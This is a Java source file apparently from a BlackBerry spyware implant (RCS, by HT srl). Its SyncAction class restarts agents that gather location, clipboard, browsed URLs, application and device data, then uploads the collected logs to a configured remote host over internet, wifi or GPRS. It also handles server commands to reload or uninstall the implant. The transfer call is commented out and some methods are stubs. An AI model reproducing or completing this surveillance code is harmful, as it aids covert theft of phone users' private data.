/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SyncAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.AgentManager;
import com.ht.rcs.blackberry.Common;
import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.log.LogCollector;
import com.ht.rcs.blackberry.transfer.Transfer;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

public class SyncAction extends SubAction {
    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);

    LogCollector logCollector;
    AgentManager agentManager;
    Transfer transfer;

    boolean wifi;
    boolean gprs;

    String host = "";

    public SyncAction(int actionId_, byte[] confParams) {
        super(actionId_);
        parse(confParams);

        Check.requires(actionId == ACTION_SYNC, "ActionId scorretto");

        logCollector = LogCollector.getInstance();
        agentManager = AgentManager.getInstance();
        transfer = Transfer.getInstance();
    }

    public SyncAction(String host_) {
        super(ACTION_SYNC);
        this.host = host_;
    }

    public boolean execute() {

        if (statusObj.crisis()) {
            debug.warn("SyncAction - no sync, we are in crisis");
            return false;
        }

        wantReload = false;
        wantUninstall = false;

        Check.asserts(logCollector != null, "uberLog == null");

        // check dei parametri

        readParams();

        // Stop degli agenti che producono un singolo log
        agentManager.reStart(Agent.AGENT_POSITION);
        agentManager.reStart(Agent.AGENT_APPLICATION);
        agentManager.reStart(Agent.AGENT_CLIPBOARD);
        agentManager.reStart(Agent.AGENT_URL);

        // l'agente device si comporta diversamente
        agentManager.reStart(Agent.AGENT_DEVICE);

        Utils.sleep(2500);

        int ret = internetSync();

        if (ret != 0) {
            debug.trace("InternetSend OK");
            return true;
        }

        debug.error("InternetSend Unable to perform");

        // eventuale sync via wifi se il display e' spento

        if (wifi) {
            ret = wifiSync();

            if (ret != 0) {
                debug.trace("WifiSync OK");
                return true;
            }

            debug.warn("WifiSync Unable to perform");
        }

        if (gprs) {
            ret = gprsSync();

            if (ret != 0) {
                debug.trace("Gprs OK");
                return true;
            }

            debug.warn("Gprs Unable to perform");
        }

        debug.error("FAILED");

        return false;
    }

    private int gprsSync() {
        // TODO Auto-generated method stub
        return 0;
    }

    private int internetSync() {
        int ret = 0; // Transfer.InternetSend(host);

        switch (ret) {
        case Common.SEND_UNINSTALL:
            debug.info("ActionSync() SEND_UNINSTALL received");
            this.wantUninstall = true;
            break;

        case Common.SEND_RELOAD:
            debug.info("ActionSync() SEND_RELOAD received");
            this.wantReload = true;
            break;

        default:
            break;
        }

        return ret;
    }

    protected boolean parse(byte[] confParams) {
        DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            this.gprs = databuffer.readInt() == 1;
            this.wifi = databuffer.readInt() == 1;

            int len = databuffer.readInt();
            byte[] buffer = new byte[len];
            databuffer.readFully(buffer);

            host = new String(buffer);

        } catch (EOFException e) {
            debug.error("params FAILED");
            return false;
        }

        return true;
    }

    private void readParams() {
        // TODO Auto-generated method stub

    }

    private int wifiSync() {
        // TODO Auto-generated method stub
        return 0;
    }

}
